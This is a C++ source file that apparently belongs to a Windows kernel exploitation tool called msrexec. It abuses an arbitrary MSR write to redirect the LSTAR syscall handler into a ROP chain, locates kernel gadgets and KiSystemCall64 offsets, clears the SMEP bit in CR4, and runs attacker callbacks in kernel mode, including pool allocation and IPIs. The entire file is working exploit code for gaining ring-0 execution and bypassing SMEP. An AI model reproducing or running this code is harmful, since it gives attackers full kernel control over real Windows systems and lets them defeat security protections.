#include "msrexec.hpp"

void msrexec_handler(callback_t* callback)
{
	// restore LSTAR....
	__writemsr(IA32_LSTAR_MSR, m_system_call);

	// call usermode code...
	(*callback)(ntoskrnl_base, get_system_routine);
}

namespace vdm
{
	msrexec_ctx::msrexec_ctx(writemsr_t wrmsr)
		: wrmsr(wrmsr)
	{
		if (!m_mov_cr4_gadget || !m_sysret_gadget || !m_pop_rcx_gadget)
			if (!find_gadgets())
				std::printf("> failed to find gadgets...\n");

		if (!m_kpcr_rsp_offset || !m_kpcr_krsp_offset || !m_system_call)
			if (!find_globals())
				std::printf("> failed to find globals...\n");

		// guess CR4 value for now... 
		// later on I get real cr4 value from IPI...
		const auto cr4_value = guess_cr4_value();

		m_smep_on.flags = cr4_value.flags;
		m_smep_off.flags = cr4_value.flags;
		m_smep_off.smep_enable = false;

		ntoskrnl_base = 
			reinterpret_cast<void*>(
				utils::kmodule::get_base("ntoskrnl.exe"));

		get_system_routine =
			reinterpret_cast<get_system_routine_t>(
				utils::kmodule::get_export(
					"ntoskrnl.exe", "RtlFindExportedRoutineByName"));

		// debug prints...
		std::printf("> m_pop_rcx_gadget -> 0x%p\n", m_pop_rcx_gadget);
		std::printf("> m_mov_cr4_gadget -> 0x%p\n", m_mov_cr4_gadget);
		std::printf("> m_sysret_gadget -> 0x%p\n", m_sysret_gadget);
		std::printf("> m_kpcr_rsp_offset -> 0x%x\n", m_kpcr_rsp_offset);
		std::printf("> m_kpcr_krsp_offset -> 0x%x\n", m_kpcr_krsp_offset);
		std::printf("> m_system_call -> 0x%p\n", m_system_call);
		std::printf("> m_smep_off -> 0x%p\n", m_smep_off.flags);
		std::printf("> m_smep_on -> 0x%p\n", m_smep_on.flags);
		std::printf("> check to make sure none of these^ are zero before pressing enter...\n");
		std::getchar();


		// when this returns back to UM, CR4 will still potentially contain invalid bits...
		this->exec
		(
			// grab the actual CR4 value from other cores by firing an IPI...
			[&](void* krnl_base, get_system_routine_t get_kroutine) -> void
			{
				_ipi_data ipi_data;
				cpuid_eax_01 cpuid_info;
				__cpuid((int*)&cpuid_info, 1);

				const auto cpuid_num =
					cpuid_info
						.cpuid_additional_information
						.initial_apic_id;

				ipi_data.core_num = cpuid_num;

				const auto ex_alloc = 
					reinterpret_cast<ex_alloc_t>(
						get_kroutine(krnl_base, "ExAllocatePool"));

				const auto ex_free = 
					reinterpret_cast<ex_free_t>(
						get_kroutine(krnl_base, "ExFreePool"));

				const auto ipi_call = 
					reinterpret_cast<ipi_call_t>(
						get_kroutine(krnl_base, "KeIpiGenericCall"));

				const auto ipi_callback_buf =
					ex_alloc(NULL, sizeof ipi_callback);
				
				memcpy(ipi_callback_buf, ipi_callback, sizeof ipi_callback);

				// please note that &ipi_data will be a 
				// pointer to the *kernel stack* so its globally mapped...
				ipi_call(ipi_callback_buf, &ipi_data);

				// fix m_smep_on and m_smep_off values now...
				m_smep_on.flags = ipi_data.cr4_val;
				m_smep_off.flags = ipi_data.cr4_val;
				m_smep_off.smep_enable = false;

				// free ipi_callback buffer and return from syscall...
				memset(ipi_callback_buf, NULL, sizeof ipi_call);
				ex_free(ipi_callback_buf);
			}
		);

		// restore CR4 values so that they are correct 
		// (syscall handler from last exec hasnt updated CR4 with corrected m_smep_off/m_smep_on)...
		this->exec([&](void* krnl_base, get_system_routine_t get_kroutine) -> void{});
	}

	auto msrexec_ctx::guess_cr4_value() -> cr4
	{
		cpuid_eax_01 cpuid_info;
		__cpuid((int*)&cpuid_info, 1);

		cpuid_eax_07 cpuid_features;
		__cpuid((int*)&cpuid_features, 7);

		cr4 cr4_value{};
		cr4_value.debugging_extensions = true;
		cr4_value.page_size_extensions = true;
		cr4_value.machine_check_enable = true;

		cr4_value.physical_address_extension =
			cpuid_info.cpuid_feature_information_edx.physical_address_extension;

		cr4_value.os_fxsave_fxrstor_support =
			cpuid_info.cpuid_feature_information_edx.fxsave_fxrstor_instructions;

		cr4_value.os_xmm_exception_support = true;

		cr4_value.fsgsbase_enable =
			IsProcessorFeaturePresent(PF_RDWRFSGSBASE_AVAILABLE);

		cr4_value.os_xsave =
			IsProcessorFeaturePresent(PF_XSAVE_ENABLED);

		cr4_value.pcid_enable =
			cpuid_info.cpuid_feature_information_ecx
			.process_context_identifiers;

		return cr4_value;
	}

	auto msrexec_ctx::find_gadgets() -> bool
	{
		m_mov_cr4_gadget =
			utils::rop::find_kgadget(
				MOV_CR4_GADGET, "xxxx");

		if (!m_mov_cr4_gadget)
			return {};

		m_sysret_gadget =
			utils::rop::find_kgadget(
				SYSRET_GADGET, "xxx");

		if (!m_sysret_gadget)
			return {};

		m_pop_rcx_gadget =
			utils::rop::find_kgadget(
				POP_RCX_GADGET, "xx");

		if (!m_pop_rcx_gadget)
			return {};

		return true;
	}

	auto msrexec_ctx::find_globals() -> bool
	{
		const auto [section_data, section_rva] =
			utils::pe::get_section(
				reinterpret_cast<std::uintptr_t>(
					LoadLibraryA("ntoskrnl.exe")), ".text");

		const auto ki_system_call =
			utils::scan(reinterpret_cast<std::uintptr_t>(
				section_data.data()), section_data.size(),
					KI_SYSCALL_SIG, KI_SYSCALL_MASK);

		if (!ki_system_call)
			return {};

		m_system_call = (ki_system_call -
			reinterpret_cast<std::uintptr_t>(
				section_data.data())) + section_rva +
					utils::kmodule::get_base("ntoskrnl.exe");

		/*
			.text:0000000140406CC0								KiSystemCall64
			.text:0000000140406CC0 0F 01 F8                     swapgs
			.text:0000000140406CC3 65 48 89 24 25 10 00 00 00   mov     gs:10h, rsp <====== + 8 bytes for gs offset...
			.text:0000000140406CCC 65 48 8B 24 25 A8 01 00 00   mov     rsp, gs:1A8h <======= + 17 bytes for gs offset...
		*/

		m_kpcr_rsp_offset = *reinterpret_cast<std::uint32_t*>(ki_system_call + 8);
		m_kpcr_krsp_offset = *reinterpret_cast<std::uint32_t*>(ki_system_call + 17);

		// handle KVA shadowing... if KVA shadowing is 
		// enabled LSTAR will point at KiSystemCall64Shadow...
		SYSTEM_KERNEL_VA_SHADOW_INFORMATION kva_info = { 0 };

		// if SystemKernelVaShadowInformation is not a valid class just 
		// return true and assume LSTAR points to KiSystemCall64...
		if (NT_SUCCESS(NtQuerySystemInformation(SystemKernelVaShadowInformation, &kva_info, sizeof(kva_info), nullptr)))
		{
			if (kva_info.KvaShadowFlags.KvaShadowEnabled)
			{				
				const auto [section_data, section_rva] =
					utils::pe::get_section(
						reinterpret_cast<std::uintptr_t>(
							LoadLibraryA("ntoskrnl.exe")), "KVASCODE");

				// no KVASCODE section so there is no way for LSTAR to be KiSystemCall64Shadow...
				if (!section_rva || section_data.empty())
					return true;

				const auto ki_system_shadow_call =
					utils::scan(reinterpret_cast<std::uintptr_t>(
						section_data.data()), section_data.size(),
							KI_SYSCALL_SHADOW_SIG, KI_SYSCALL_SHADOW_MASK);

				// already set m_syscall_call so we just return true...
				if (!ki_system_shadow_call)
					return true; 

				// else we update m_system_call with KiSystemCall64Shadow...
				m_system_call = (ki_system_shadow_call -
					reinterpret_cast<std::uintptr_t>(
						section_data.data())) + section_rva +
							utils::kmodule::get_base("ntoskrnl.exe");
			}
		}
		return true;
	}

	void msrexec_ctx::exec(callback_t kernel_callback)
	{
		const thread_info_t thread_info =
		{ 
			GetPriorityClass(GetCurrentProcess()), 
			GetThreadPriority(GetCurrentThread()) 
		};

		SetPriorityClass(GetCurrentProcess(), REALTIME_PRIORITY_CLASS);
		SetThreadPriority(GetCurrentThread(), THREAD_PRIORITY_TIME_CRITICAL);

		// set LSTAR to first rop gadget... race begins here...
		if (!wrmsr(IA32_LSTAR_MSR, m_pop_rcx_gadget))
			std::printf("> failed to set LSTAR...\n");
		else
			// go go gadget kernel execution...
			syscall_wrapper(&kernel_callback);

		SetPriorityClass(GetCurrentProcess(), thread_info.first);
		SetThreadPriority(GetCurrentThread(), thread_info.second);
	}

	void msrexec_ctx::set_wrmsr(writemsr_t wrmsr)
	{ this->wrmsr = wrmsr; }

	auto msrexec_ctx::get_wrmsr() -> writemsr_t const
	{ return this->wrmsr; }
}